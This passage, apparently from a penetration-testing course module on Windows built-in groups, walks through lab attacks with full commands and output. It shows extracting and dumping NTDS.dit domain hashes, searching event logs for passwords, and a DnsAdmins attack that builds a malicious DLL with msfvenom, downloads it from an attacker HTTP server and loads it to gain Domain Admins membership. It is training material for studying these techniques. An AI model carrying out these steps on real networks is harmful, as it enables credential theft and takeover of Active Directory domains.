The operation completed successfully.


C:\htb&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SAM SAM.<span class="hljs-keyword">SAV</span>

The operation completed successfully.
</code></pre>
<p>It&#39;s worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag is specified.</p>
<p><strong>Extracting Credentials from NTDS.dit</strong></p>
<p>With the NTDS.dit extracted, we can use a tool such as <code>secretsdump.py</code> or the PowerShell <code>DSInternals</code> module to extract all Active Directory account credentials. Let&#39;s obtain the NTLM hash for just the <code>administrator</code> account for the domain using <code>DSInternals</code>.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Import-Module .\DSInternals.psd1
PS C:\htb&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb&gt; Get-ADDBAccount -DistinguishedName <span class="hljs-string">'CN=administrator,CN=users,DC=inlanefreight,DC=local'</span> -DBPath .\ntds.dit -BootKey $key

<span class="hljs-attr">DistinguishedName:</span> CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
<span class="hljs-attr">Sid:</span> S<span class="hljs-bullet">-1</span><span class="hljs-bullet">-5</span><span class="hljs-bullet">-21</span><span class="hljs-bullet">-669053619</span><span class="hljs-bullet">-2741956077</span><span class="hljs-bullet">-1013132368</span><span class="hljs-bullet">-500</span>
<span class="hljs-attr">Guid:</span> f28ab72b<span class="hljs-bullet">-9</span>b16<span class="hljs-bullet">-4</span>b52<span class="hljs-bullet">-9</span>f63-ef4ea96de215
<span class="hljs-attr">SamAccountName:</span> Administrator
<span class="hljs-attr">SamAccountType:</span> User
<span class="hljs-attr">UserPrincipalName:</span>
<span class="hljs-attr">PrimaryGroupId:</span> <span class="hljs-number">513</span>
<span class="hljs-attr">SidHistory:</span>
<span class="hljs-attr">Enabled:</span> <span class="hljs-literal">True</span>
<span class="hljs-attr">UserAccountControl:</span> NormalAccount, PasswordNeverExpires
<span class="hljs-attr">AdminCount:</span> <span class="hljs-literal">True</span>
<span class="hljs-attr">Deleted:</span> <span class="hljs-literal">False</span>
<span class="hljs-attr">LastLogonDate:</span> <span class="hljs-number">5</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2021</span> <span class="hljs-number">5</span>:<span class="hljs-number">40</span>:<span class="hljs-number">30</span> PM
<span class="hljs-attr">DisplayName:</span>
<span class="hljs-attr">GivenName:</span>
<span class="hljs-attr">Surname:</span>
<span class="hljs-attr">Description:</span> Built-in account for administering the computer/domain
<span class="hljs-attr">ServicePrincipalName:</span>
<span class="hljs-attr">SecurityDescriptor:</span> DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
<span class="hljs-attr">Owner:</span> S<span class="hljs-bullet">-1</span><span class="hljs-bullet">-5</span><span class="hljs-bullet">-21</span><span class="hljs-bullet">-669053619</span><span class="hljs-bullet">-2741956077</span><span class="hljs-bullet">-1013132368</span><span class="hljs-bullet">-512</span>
Secrets
<span class="hljs-attr">  NTHash:</span> cf3a5525ee9414229e66279623ed5c58
<span class="hljs-attr">  LMHash:</span>
<span class="hljs-attr">  NTHashHistory:</span>
<span class="hljs-attr">  LMHashHistory:</span>
<span class="hljs-attr">  SupplementalCredentials:</span>
<span class="hljs-attr">    ClearText:</span>
<span class="hljs-attr">    NTLMStrongHash:</span> <span class="hljs-number">7790</span>d8406b55c380f98b92bb2fdc63a7
<span class="hljs-attr">    Kerberos:</span>
<span class="hljs-attr">      Credentials:</span>
        DES_CBC_MD5
<span class="hljs-attr">          Key:</span> d60dfbbf20548938
<span class="hljs-attr">      OldCredentials:</span>
<span class="hljs-attr">      Salt:</span> WIN-NB4NGP3TKNKAdministrator
<span class="hljs-attr">      Flags:</span> <span class="hljs-number">0</span>
<span class="hljs-attr">    KerberosNew:</span>
<span class="hljs-attr">      Credentials:</span>
        AES256_CTS_HMAC_SHA1_96
<span class="hljs-attr">          Key:</span> <span class="hljs-number">5</span>db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
<span class="hljs-attr">          Iterations:</span> <span class="hljs-number">4096</span>
        AES128_CTS_HMAC_SHA1_96
<span class="hljs-attr">          Key:</span> <span class="hljs-number">94</span>c300d0e47775b407f2496a5cca1a0a
<span class="hljs-attr">          Iterations:</span> <span class="hljs-number">4096</span>
        DES_CBC_MD5
<span class="hljs-attr">          Key:</span> d60dfbbf20548938
<span class="hljs-attr">          Iterations:</span> <span class="hljs-number">4096</span>
<span class="hljs-attr">      OldCredentials:</span>
<span class="hljs-attr">      OlderCredentials:</span>
<span class="hljs-attr">      ServiceCredentials:</span>
<span class="hljs-attr">      Salt:</span> WIN-NB4NGP3TKNKAdministrator
<span class="hljs-attr">      DefaultIterationCount:</span> <span class="hljs-number">4096</span>
<span class="hljs-attr">      Flags:</span> <span class="hljs-number">0</span>
<span class="hljs-attr">    WDigest:</span>
Key Credentials:
Credential Roaming
<span class="hljs-attr">  Created:</span>
<span class="hljs-attr">  Modified:</span>
<span class="hljs-attr">  Credentials:</span>
</code></pre>
<p><strong>Extracting Hashes Using SecretsDump</strong></p>
<p>We can also use <code>SecretsDump</code> offline to extract hashes from the <code>ntds.dit</code> file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using <code>Hashcat</code> to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, created a dictionary of disallowed words, etc.).</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.23</span>.dev1+<span class="hljs-number">20210504.123629</span><span class="hljs-number">.24</span>a0ae6f - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[*] Target system bootKey: <span class="hljs-number">0xc0a9116f907bd37afaaa845cb87d0550</span>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK <span class="hljs-meta"># 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330</span>
[*] Reading and decrypting hashes from ntds.dit 
<span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">cf3a5525ee9414229e66279623ed5c58::</span>:
<span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span><span class="hljs-symbol">d6cfe0d16ae931b73c59d7e0c089c0::</span>:
WINLPE-DC01$:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span><span class="hljs-symbol">abf052dcef31f6305f1d4c84dfa7484::</span>:
<span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">a05824b8c279f2eb31495a012473d129::</span>:
htb-student:<span class="hljs-number">1103</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">2487</span><span class="hljs-symbol">a01dd672b583415cb52217824bb5::</span>:
<span class="hljs-symbol">svc_backup:</span><span class="hljs-number">1104</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">cf3a5525ee9414229e66279623ed5c58::</span>:
<span class="hljs-symbol">bob:</span><span class="hljs-number">1105</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">cf3a5525ee9414229e66279623ed5c58::</span>:
<span class="hljs-symbol">hyperv_adm:</span><span class="hljs-number">1106</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">cf3a5525ee9414229e66279623ed5c58::</span>:
<span class="hljs-symbol">printsvc:</span><span class="hljs-number">1107</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">cf3a5525ee9414229e66279623ed5c58::</span>:

<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<hr>
<h3 id="robocopy">Robocopy</h3>
<p><strong>Copying Files with Robocopy</strong></p>
<p>The built-in utility <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy">robocopy</a> can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the <code>copy</code> command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; robocopy /B <span class="hljs-string">E:</span>\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   <span class="hljs-string">ROBOCOPY     :</span>:     Robust File Copy <span class="hljs-keyword">for</span> Windows
-------------------------------------------------------------------------------

  <span class="hljs-string">Started :</span> Thursday, May <span class="hljs-number">6</span>, <span class="hljs-number">2021</span> <span class="hljs-number">1</span>:<span class="hljs-number">11</span>:<span class="hljs-number">47</span> PM
   <span class="hljs-string">Source :</span> <span class="hljs-string">E:</span>\Windows\NTDS\
     <span class="hljs-string">Dest :</span> <span class="hljs-string">C:</span>\Tools\ntds\

    <span class="hljs-string">Files :</span> ntds.dit

  <span class="hljs-string">Options :</span> <span class="hljs-regexp">/DCOPY:DA /</span><span class="hljs-string">COPY:</span>DAT <span class="hljs-regexp">/B /</span><span class="hljs-string">R:</span><span class="hljs-number">1000000</span> /<span class="hljs-string">W:</span><span class="hljs-number">30</span>

------------------------------------------------------------------------------

          New Dir          <span class="hljs-number">1</span>    <span class="hljs-string">E:</span>\Windows\NTDS\
<span class="hljs-number">100</span>%        New File              <span class="hljs-number">16.0</span> m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    <span class="hljs-string">Dirs :</span>         <span class="hljs-number">1</span>         <span class="hljs-number">1</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>
   <span class="hljs-string">Files :</span>         <span class="hljs-number">1</span>         <span class="hljs-number">1</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>
   <span class="hljs-string">Bytes :</span>   <span class="hljs-number">16.00</span> m   <span class="hljs-number">16.00</span> m         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>
   <span class="hljs-string">Times :</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>                       <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>


   <span class="hljs-string">Speed :</span>           <span class="hljs-number">356962042</span> Bytes/sec.
   <span class="hljs-string">Speed :</span>           <span class="hljs-number">20425.531</span> MegaBytes/min.
   <span class="hljs-string">Ended :</span> Thursday, May <span class="hljs-number">6</span>, <span class="hljs-number">2021</span> <span class="hljs-number">1</span>:<span class="hljs-number">11</span>:<span class="hljs-number">47</span> PM
</code></pre>
<p>This eliminates the need for any external tools.</p>
<h2 id="event-log-readers">Event Log Readers</h2>
<hr>
<p>Suppose <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation">auditing of process creation</a> events and corresponding command line values is enabled. In that case, this information is saved to the Windows security event log as event ID <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688">4688: A new process has been created</a>. Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior and identify binaries that should not be present on a system. This data can be shipped to a SIEM tool or ingested into a search tool, such as ElasticSearch, to give defenders visibility into what binaries are being run on systems in the network. The tools would then flag any potentially malicious activity, such as the <code>whoami</code>, <code>netstat</code>, and <code>tasklist</code> commands being run from a marketing executive&#39;s workstation.</p>
<p>This <a href="https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html">study</a> shows some of the most run commands by attackers after initial access (<code>tasklist</code>, <code>ver</code>, <code>ipconfig</code>, <code>systeminfo</code>, etc.), for reconnaissance (<code>dir</code>, <code>net view</code>, <code>ping</code>, <code>net use</code>, <code>type</code>, etc.), and for spreading malware within a network (<code>at</code>, <code>reg</code>, <code>wmic</code>, <code>wusa</code>, etc.). Aside from monitoring for these commands being run, an organization could take things a step further and restrict the execution of specific commands using fine-tuned AppLocker rules. For an organization with a tight security budget, leveraging these built-in tools from Microsoft can offer excellent visibility into network activities at the host level. Most modern enterprise EDR tools perform detection/blocking but can be out of reach for many organizations due to budgetary and personnel constraints. This small example shows that security improvements, such as network and host-level visibility, can be done with minimal effort, cost, and massive impact.</p>
<p>I performed a penetration test against a medium-sized organization a few years ago with a small security team, no enterprise EDR, but was using a similar configuration to what was detailed above (auditing process creation and command-line values). They caught and contained one of my team members when they ran the <code>tasklist</code> command from a member of the finance department&#39;s workstation (after capturing credentials using <code>Responder</code> and cracking them offline).</p>
<p>Administrators or members of the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\">Event Log Readers</a>?redirectedfrom=MSDN#event-log-readers) group have permission to access this log. It is conceivable that system administrators might want to add power users or developers into this group to perform certain tasks without having to grant them administrative access.</p>
<p><strong>Confirming Group Membership</strong></p>
<p>Event Log Readers</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup <span class="hljs-string">"Event Log Readers"</span>

Alias <span class="hljs-built_in">name</span>     Event <span class="hljs-built_in">Log</span> Readers
<span class="hljs-built_in">Comment</span>        <span class="hljs-built_in">Members</span> of this <span class="hljs-built_in">group</span> can read event logs <span class="hljs-keyword">from</span> <span class="hljs-built_in">local</span> machine

<span class="hljs-built_in">Members</span>

-------------------------------------------------------------------------------
logger
The command completed successfully.
</code></pre>
<p>Microsoft has published a reference <a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf">guide</a> for all built-in Windows commands, including syntax, parameters, and examples. Many Windows commands support passing a password as a parameter, and if auditing of process command lines is enabled, this sensitive information will be captured.</p>
<p>We can query Windows events from the command line using the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">wevtutil</a> utility and the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1">Get-WinEvent</a> PowerShell cmdlet.</p>
<p><strong>Searching Security Logs Using wevtutil</strong></p>
<p>Event Log Readers</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; wevtutil qe Security <span class="hljs-regexp">/rd:true /</span><span class="hljs-string">f:</span>text | Select-String <span class="hljs-string">"/user"</span>

        Process Command <span class="hljs-string">Line:</span>   net use <span class="hljs-string">T:</span> \\fs01\backups /<span class="hljs-string">user:</span>tim MyStr0ngP<span class="hljs-meta">@ssword</span>
</code></pre>
<p>We can also specify alternate credentials for <code>wevtutil</code> using the parameters <code>/u</code> and <code>/p</code>.</p>
<p><strong>Passing Credentials to wevtutil</strong></p>
<p>Event Log Readers</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; wevtutil qe Security /<span class="hljs-attribute">rd</span>:true /<span class="hljs-attribute">f</span>:text /<span class="hljs-attribute">r</span>:share01 /<span class="hljs-attribute">u</span>:julie.clay /<span class="hljs-attribute">p</span>:Welcome1 | findstr <span class="hljs-string">"/user"</span>
</code></pre>
<p>For <code>Get-WinEvent</code>, the syntax is as follows. In this example, we filter for process creation events (4688), which contain <code>/user</code> in the process command line.</p>
<p>Note: Searching the <code>Security</code> event log with <code>Get-WInEvent</code> requires administrator access or permissions adjusted on the registry key <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code>. Membership in just the <code>Event Log Readers</code> group is not sufficient.</p>
<p><strong>Searching Security Logs Using Get-WinEvent</strong></p>
<p>Event Log Readers</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $<span class="hljs-emphasis">_.ID -eq 4688 -and $_</span>.Properties[8].Value -like <span class="hljs-emphasis">'*/user*'</span>} | Select-Object @{name=<span class="hljs-emphasis">'CommandLine'</span>;expression={ $<span class="hljs-emphasis">_.Properties[8].Value }}

</span><span class="hljs-section">CommandLine
-----------</span>
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
</code></pre>
<p>The cmdlet can also be run as another user with the <code>-Credential</code> parameter.</p>
<p>Other logs include <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_logging\_windows?view=powershell-7.1">PowerShell Operational</a> log, which may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.</p>
<h2 id="dnsadmins">DnsAdmins</h2>
<hr>
<p>Members of the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins">DnsAdmins</a> group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as <code>NT AUTHORITY\SYSTEM</code>, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd">dnscmd</a> utility to specify the path of the plugin DLL. As detailed in this excellent <a href="https://adsecurity.org/?p=4064">post</a>, the following attack can be performed when DNS is run on a Domain Controller (which is very common):</p>
<ul>
<li>DNS management is performed over RPC</li>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL&#39;s path. This can be done with the <code>dnscmd</code> tool from the command line</li>
<li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li>
<li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller&#39;s machine account can access)</li>
<li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li>
</ul>
<p>Let&#39;s step through the attack.</p>
<hr>
<h3 id="leveraging-dnsadmins-access">Leveraging DnsAdmins Access</h3>
<p><strong>Generating Malicious DLL</strong></p>
<p>We can generate a malicious DLL to add a user to the <code>domain admins</code> group using <code>msfvenom</code>.</p>
<p>DnsAdmins</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -p windows/x64/exec cmd=<span class="hljs-string">'net group "domain admins" netadm /add /domain'</span> -f dll -o adduser.dll

[-] No <span class="hljs-keyword">platform</span> was selected, choosing Msf::<span class="hljs-keyword">Module</span>::<span class="hljs-keyword">Platform</span>::Windows <span class="hljs-keyword">from</span> the payload
[-] No arch selected, selecting arch: x64 <span class="hljs-keyword">from</span> the payload
No encoder specified, outputting raw payload
Payload size: <span class="hljs-number">313</span> bytes
<span class="hljs-keyword">Final</span> size <span class="hljs-keyword">of</span> dll file: <span class="hljs-number">5120</span> bytes
Saved <span class="hljs-keyword">as</span>: adduser.dll
</code></pre>
<p><strong>Starting Local HTTP Server</strong></p>
<p>Next, start a Python HTTP server.</p>
<p>DnsAdmins</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ python3 -m http.server <span class="hljs-number">7777</span>

Serving HTTP on <span class="hljs-number">0.0.0.0</span> port <span class="hljs-number">7777</span> (http://<span class="hljs-number">0.0.0.0:7777</span>/) ...
<span class="hljs-number">10.129.43.9</span> - - <span class="hljs-string">[19/May/2021 19:22:46]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /adduser.dll HTTP/1.1"</span> <span class="hljs-number">200</span> -
</code></pre>
<p><strong>Downloading File to Target</strong></p>
<p>Download the file to the target.</p>
<p>DnsAdmins</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt;  wget <span class="hljs-string">"http://10.10.14.3:7777/adduser.dll"</span> -outfile <span class="hljs-string">"adduser.dll"</span>
</code></pre>
<p>Let&#39;s first see what happens if we use the <code>dnscmd</code> utility to load a custom DLL with a non-privileged user.</p>
<p><strong>Loading DLL as Non-Privileged User</strong></p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; dnscmd.exe /config /serverlevelplugindll C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\n</span>etadm<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\a</span>dduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
</code></pre>
<p>As expected, attempting to execute this command as a normal user isn&#39;t successful. Only members of the <code>DnsAdmins</code> group are permitted to do this.</p>
<p><strong>Loading DLL as Member of DnsAdmins</strong></p>
<p>DnsAdmins</p>
<pre><code class="lang-powershell-session">C:\htb&gt; Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364<span class="hljs-string">-4805</span>-a4bb<span class="hljs-string">-7153051</span>a8c14
SamAccountName    : netadm
SID               : S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-669053619</span><span class="hljs-string">-2741956077</span><span class="hljs-string">-1013132368</span><span class="hljs-string">-1109</span>
</code></pre>
<p><strong>Loading Custom DLL</strong></p>
<p>After confirming group membership in the <code>DnsAdmins</code> group, we can re-run the command to load a custom DLL.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; dnscmd.exe /config /serverlevelplugindll C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\n</span>etadm<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\a</span>dduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
</code></pre>
<p>Note: We must specify the full path to our custom DLL or the attack will not work properly.</p>
<p>Only the <code>dnscmd</code> utility can be used by members of the <code>DnsAdmins</code> group, as they do not directly have permission on the registry key.</p>
<p>With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn&#39;t give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.</p>
<p>After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let&#39;s check our current user&#39;s permissions on the DNS service.</p>
<p><strong>Finding User&#39;s SID</strong></p>
<p>First, we need our user&#39;s SID.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wmic useraccount where name="netadm" get sid

SID
S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-669053619</span><span class="hljs-string">-2741956077</span><span class="hljs-string">-1013132368</span><span class="hljs-string">-1109</span>
</code></pre>
<p><strong>Checking Permissions on DNS Service</strong></p>
<p>Once we have the user&#39;s SID, we can use the <code>sc</code> command to check permissions on the service. Per this <a href="https://www.winhelponline.com/blog/view-edit-service-permissions-windows/">article</a>, we can see that our user has <code>RPWP</code> permissions which translate to <code>SERVICE_START</code> and <code>SERVICE_STOP</code>, respectively.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; sc.exe sdshow DNS

<span class="hljs-symbol">D:</span>(A<span class="hljs-comment">;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)</span>
</code></pre>
<p>Check out the <code>Windows Fundamentals</code> module for an explanation of SDDL syntax in Windows.</p>
<p><strong>Stopping the DNS Service</strong></p>
<p>After confirming these permissions, we can issue the following commands to stop and start the service.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc stop dns

<span class="hljs-attribute">SERVICE_NAME</span>: dns
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">3</span>  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x1
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x7530
</code></pre>
<p>The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).</p>
<p><strong>Starting the DNS Service</strong></p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc start dns

<span class="hljs-attribute">SERVICE_NAME</span>: dns
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">2</span>  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x7d0
        <span class="hljs-attribute">PID                </span>: <span class="hljs-number">6960</span>
        <span class="hljs-attribute">FLAGS              </span>:
</code></pre>
<p><strong>Confirming Group Membership</strong></p>
<p>If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net group <span class="hljs-string">"Domain Admins"</span> /dom

Group name     Domain Admins
Comment        Designated administrators <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator            netadm
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<hr>
<h3 id="cleaning-up">Cleaning Up</h3>
<p>Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.</p>
<p>These steps must be taken from an elevated console with a local or domain admin account.</p>
<p><strong>Confirming Registry Key Added</strong></p>
<p>The first step is confirming that the <code>ServerLevelPluginDll</code> registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; reg query <span class="hljs-symbol">\\</span>10.129.43.9<span class="hljs-symbol">\H</span>KLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\S</span>ervices<span class="hljs-symbol">\D</span>NS<span class="hljs-symbol">\P</span>arameters

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\S</span>ervices<span class="hljs-symbol">\D</span>NS<span class="hljs-symbol">\P</span>arameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad<span class="hljs-symbol">\0</span>isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1<span class="hljs-symbol">\0</span>8.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
</code></pre>
<p><strong>Deleting Registry Key</strong></p>
<p>We can use the <code>reg delete</code> command to remove the key that points to our custom DLL.</p>
<p>DnsAdmins</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; reg delete <span class="hljs-symbol">\\</span>10.129.43.9<span class="hljs-symbol">\H</span>KLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\S</span>ervices<span class="hljs-symbol">\D</span>NS<span class="hljs-symbol">\P</span>arameters  /v ServerLevelPluginDll

